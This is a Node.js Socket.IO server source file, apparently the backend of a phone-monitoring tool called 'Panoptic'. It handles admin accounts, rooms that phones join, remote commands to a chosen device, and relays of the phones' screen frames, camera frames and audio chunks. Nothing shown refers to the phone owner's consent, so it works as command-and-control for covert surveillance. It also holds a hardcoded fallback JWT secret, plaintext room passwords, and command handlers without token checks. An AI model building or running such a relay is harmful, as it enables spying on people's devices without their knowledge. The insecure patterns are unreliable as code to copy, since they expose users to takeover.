const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const cors = require('cors');
const jwt = require('jsonwebtoken');
const sqlite3 = require('sqlite3').verbose();
const bcrypt = require('bcryptjs');
const path = require('path');

const app = express();
app.use(cors({ origin: "*", methods: ["GET", "POST"] }));

const server = http.createServer(app);
const io = new Server(server, {
    cors: { origin: "*", methods: ["GET", "POST"] }
});

const JWT_SECRET = process.env.JWT_SECRET || 'clave_secreta_super_segura_mirror_dark';
const activeRooms = new Map();

// --- CONFIGURACIÓN DE BASE DE DATOS SQLITE ---
const dbPath = path.resolve(__dirname, 'panoptic.db');
const db = new sqlite3.Database(dbPath, (err) => {
    if (err) {
        console.error('[-] Error al conectar con SQLite:', err.message);
    } else {
        console.log('[+] Conectado a la base de datos SQLite.');
        initTables();
    }
});

function initTables() {
    db.serialize(() => {
        db.run(`CREATE TABLE IF NOT EXISTS users (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            nombre TEXT NOT NULL,
            username TEXT UNIQUE NOT NULL,
            correo TEXT UNIQUE NOT NULL,
            password TEXT NOT NULL
        )`);

        db.run(`CREATE TABLE IF NOT EXISTS rooms (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            room_name TEXT NOT NULL,
            room_code TEXT UNIQUE NOT NULL,
            password TEXT NOT NULL,
            user_id INTEGER,
            FOREIGN KEY(user_id) REFERENCES users(id) ON DELETE CASCADE
        )`);

        db.run(`CREATE TABLE IF NOT EXISTS devices (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            device_socket_id TEXT UNIQUE NOT NULL,
            device_name TEXT NOT NULL,
            propietario TEXT,
            room_code TEXT,
            battery_level INTEGER DEFAULT 0,
            last_seen DATETIME DEFAULT CURRENT_TIMESTAMP,
            FOREIGN KEY(room_code) REFERENCES rooms(room_code) ON DELETE CASCADE
        )`);
    });
}

// --- MÉTODOS DE BASE DE DATOS ---
db.registerAdmin = (nombre, username, correo, pass, callback) => {
    db.get(`SELECT id FROM users WHERE username = ? OR correo = ?`, [username, correo], (err, row) => {
        if (err) return callback(err);
        if (row) return callback(new Error('El nombre de usuario o correo ya están registrados.'));

        bcrypt.hash(pass, 10, (err, hash) => {
            if (err) return callback(err);
            db.run(
                `INSERT INTO users (nombre, username, correo, password) VALUES (?, ?, ?, ?)`,
                [nombre, username, correo, hash],
                function (err) {
                    callback(err, this ? this.lastID : null);
                }
            );
        });
    });
};

db.verifyAdmin = (identifier, pass, callback) => {
    db.get(`SELECT * FROM users WHERE username = ? OR correo = ?`, [identifier, identifier], (err, user) => {
        if (err || !user) return callback(null, null);

        bcrypt.compare(pass, user.password, (err, match) => {
            if (err || !match) return callback(null, null);
            callback(null, user);
        });
    });
};

db.updateUser = (userId, newUsername, newPassword, callback) => {
    if (newPassword) {
        bcrypt.hash(newPassword, 10, (err, hash) => {
            if (err) return callback(err);
            db.run(
                `UPDATE users SET username = ?, password = ? WHERE id = ?`,
                [newUsername, hash, userId],
                callback
            );
        });
    } else {
        db.run(
            `UPDATE users SET username = ? WHERE id = ?`,
            [newUsername, userId],
            callback
        );
    }
};

db.deleteUser = (userId, callback) => {
    db.run(`DELETE FROM users WHERE id = ?`, [userId], callback);
};

db.saveRoomForUser = (userId, roomCode, roomName, password, callback) => {
    db.run(
        `INSERT INTO rooms (room_name, room_code, password, user_id) VALUES (?, ?, ?, ?)`,
        [roomName, roomCode, password, userId],
        callback
    );
};

db.updateRoom = (userId, roomName, password, callback) => {
    db.run(
        `UPDATE rooms SET room_name = ?, password = ? WHERE user_id = ?`,
        [roomName, password, userId],
        callback
    );
};

db.deleteRoomByUser = (userId, callback) => {
    db.run(`DELETE FROM rooms WHERE user_id = ?`, [userId], callback);
};

db.getRoomByUser = (userId, callback) => {
    db.get(`SELECT * FROM rooms WHERE user_id = ?`, [userId], callback);
};

db.getRoomsByUser = (userId, callback) => {
    db.all(`SELECT * FROM rooms WHERE user_id = ?`, [userId], callback);
};

db.getRoom = (roomCode, callback) => {
    db.get(`SELECT * FROM rooms WHERE room_code = ?`, [roomCode], callback);
};

db.upsertDevice = (socketId, deviceName, propietario, roomCode, battery = 0, callback) => {
    db.run(
        `INSERT INTO devices (device_socket_id, device_name, propietario, room_code, battery_level, last_seen) 
         VALUES (?, ?, ?, ?, ?, datetime('now'))
         ON CONFLICT(device_socket_id) DO UPDATE SET 
         device_name = excluded.device_name, 
         propietario = excluded.propietario,
         battery_level = excluded.battery_level,
         room_code = excluded.room_code,
         last_seen = datetime('now')`,
        [socketId, deviceName, propietario, roomCode, battery],
        callback || (() => { })
    );
};

db.removeDevice = (socketId, callback) => {
    db.run(`DELETE FROM devices WHERE device_socket_id = ?`, [socketId], callback || (() => { }));
};


// --- GESTIÓN DE SOCKET.IO ---
io.on('connection', (socket) => {
    console.log(`[+] Conexión establecida: ${socket.id}`);

    socket.on('admin_login', ({ identifier, pass }) => {
        db.verifyAdmin(identifier, pass, (err, user) => {
            if (err || !user) {
                socket.emit('admin_login_error', { message: 'Credenciales inválidas.' });
            } else {
                const token = jwt.sign(
                    { id: user.id, username: user.username, correo: user.correo, nombre: user.nombre },
                    JWT_SECRET,
                    { expiresIn: '7d' }
                );
                socket.emit('admin_login_success', { message: 'Acceso autorizado', token, user: { username: user.username, correo: user.correo } });
            }
        });
    });

    socket.on('admin_register', ({ nombre, username, correo, pass }) => {
        db.registerAdmin(nombre, username, correo, pass, (err) => {
            if (err) {
                socket.emit('admin_register_error', { message: err.message });
            } else {
                socket.emit('admin_register_success', { message: 'Usuario registrado con éxito.' });
            }
        });
    });

    socket.on('update_user_profile', ({ token, newUsername, newPassword }) => {
        jwt.verify(token, JWT_SECRET, (err, decodedUser) => {
            if (err) {
                socket.emit('auth_error', { message: 'No autorizado' });
                return;
            }

            db.updateUser(decodedUser.id, newUsername, newPassword, (dbErr) => {
                if (dbErr) {
                    socket.emit('user_update_error', { message: 'Error al actualizar el usuario' });
                } else {
                    const newToken = jwt.sign(
                        { id: decodedUser.id, username: newUsername, correo: decodedUser.correo, nombre: decodedUser.nombre },
                        JWT_SECRET,
                        { expiresIn: '7d' }
                    );
                    socket.emit('user_update_success', { message: 'Perfil actualizado con éxito', token: newToken });
                }
            });
        });
    });

    socket.on('delete_user_account', ({ token }) => {
        jwt.verify(token, JWT_SECRET, (err, decodedUser) => {
            if (err) return socket.emit('auth_error', { message: 'No autorizado' });

            db.getRoomsByUser(decodedUser.id, (__, roomsList) => {
                if (roomsList) {
                    roomsList.forEach(r => {
                        if (activeRooms.has(r.room_code)) activeRooms.delete(r.room_code);
                    });
                }

                db.deleteUser(decodedUser.id, (dbErr) => {
                    if (dbErr) {
                        socket.emit('delete_account_error', { message: 'Error al eliminar la cuenta' });
                    } else {
                        socket.emit('delete_account_success', { message: 'Cuenta eliminada permanentemente' });
                    }
                });
            });
        });
    });

    socket.on('restore_user_session', ({ token }) => {
        jwt.verify(token, JWT_SECRET, (err, decodedUser) => {
            if (err) return socket.emit('auth_error', { message: 'Token inválido' });

            db.getRoomsByUser(decodedUser.id, (dbErr, roomsList) => {
                if (dbErr || !roomsList) {
                    socket.emit('no_active_rooms', { message: 'Sin salas activas' });
                    return;
                }

                roomsList.forEach(r => {
                    if (!activeRooms.has(r.room_code)) {
                        activeRooms.set(r.room_code, { password: r.password, devices: new Map() });
                    }
                });

                socket.isPanel = true;
                socket.emit('session_restored', { rooms: roomsList });
            });
        });
    });

    socket.on('create_room', ({ token, roomName, password }) => {
        jwt.verify(token, JWT_SECRET, (err, decodedUser) => {
            if (err) return socket.emit('auth_error', { message: 'No autorizado' });

            const roomCode = Math.random().toString(36).substring(2, 8).toUpperCase();

            db.saveRoomForUser(decodedUser.id, roomCode, roomName, password, (dbErr) => {
                if (dbErr) return socket.emit('room_error', { message: 'Error al registrar la sala' });

                if (!activeRooms.has(roomCode)) {
                    activeRooms.set(roomCode, { password, devices: new Map() });
                }

                socket.join(roomCode);
                socket.roomCode = roomCode;
                socket.isPanel = true;

                const roomObj = { room_code: roomCode, room_name: roomName, password: password };
                socket.emit('room_created', roomObj);
                
                const room = activeRooms.get(roomCode);
                socket.emit('update_devices', { roomCode, devices: Array.from(room.devices.values()) });
            });
        });
    });

    socket.on('register_phone', (data) => {
        const { roomCode, password, name, propietario, battery } = data;

        db.getRoom(roomCode, (err, roomData) => {
            if (err || !roomData || roomData.password !== password) {
                socket.emit('auth_error', { message: 'Sala inexistente o contraseña incorrecta' });
                return;
            }

            if (!activeRooms.has(roomCode)) {
                activeRooms.set(roomCode, { password: roomData.password, devices: new Map() });
            }

            const room = activeRooms.get(roomCode);
            socket.join(roomCode);
            socket.roomCode = roomCode;
            socket.isPhone = true;

            const deviceInfo = {
                id: socket.id,
                name: name || `Dispositivo (${socket.id.substring(0, 4)})`,
                propietario: propietario || 'Desconocido',
                battery: battery !== undefined ? battery : 0,
                ip: socket.handshake.address
            };

            room.devices.set(socket.id, deviceInfo);
            db.upsertDevice(socket.id, deviceInfo.name, deviceInfo.propietario, roomCode, deviceInfo.battery);

            io.to(roomCode).emit('update_devices', { roomCode, devices: Array.from(room.devices.values()) });
        });
    });

    socket.on('kick_device', ({ targetId }) => {
        const roomCode = socket.roomCode;
        if (!roomCode || !activeRooms.has(roomCode)) return;

        const room = activeRooms.get(roomCode);
        if (room.devices.has(targetId)) {
            room.devices.delete(targetId);
            db.removeDevice(targetId);

            io.to(targetId).emit('kicked_from_room');
            io.to(roomCode).emit('update_devices', { roomCode, devices: Array.from(room.devices.values()) });
        }
    });

    socket.on('send_command_to_device', (data) => {
        const roomCode = socket.roomCode;
        if (!roomCode) return;
        io.to(data.targetId).emit('command_to_phone', { action: data.action, lens: data.lens || 'back' });
    });

    socket.on('phone_response', (response) => {
        const roomCode = socket.roomCode;
        if (!roomCode) return;
        io.to(roomCode).emit('phone_response', { ...response, deviceId: socket.id });
    });

    socket.on('screen_frame', (base64Frame) => {
        const roomCode = socket.roomCode;
        if (!roomCode) return;
        io.to(roomCode).emit('screen_frame', { deviceId: socket.id, frame: base64Frame });
    });

    socket.on('camera_frame', (base64Frame) => {
        const roomCode = socket.roomCode;
        if (!roomCode) return;
        io.to(roomCode).emit('camera_frame', { deviceId: socket.id, frame: base64Frame });
    });

    socket.on('audio_chunk', (base64Audio) => {
        const roomCode = socket.roomCode;
        if (!roomCode) return;
        io.to(roomCode).emit('audio_chunk', { deviceId: socket.id, chunk: base64Audio });
    });

    socket.on('disconnect', (reason) => {
        console.log(`[-] Desconectado (${reason}): ${socket.id}`);

        const roomCode = socket.roomCode;
        if (roomCode && activeRooms.has(roomCode)) {
            const room = activeRooms.get(roomCode);
            if (room.devices.has(socket.id)) {
                room.devices.delete(socket.id);
                db.removeDevice(socket.id);
                io.to(roomCode).emit('update_devices', { roomCode, devices: Array.from(room.devices.values()) });
            }
        }
    });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, '0.0.0.0', () => {
    console.log(`Servidor Panoptic Multi-Tenant listo en el puerto ${PORT}`);
});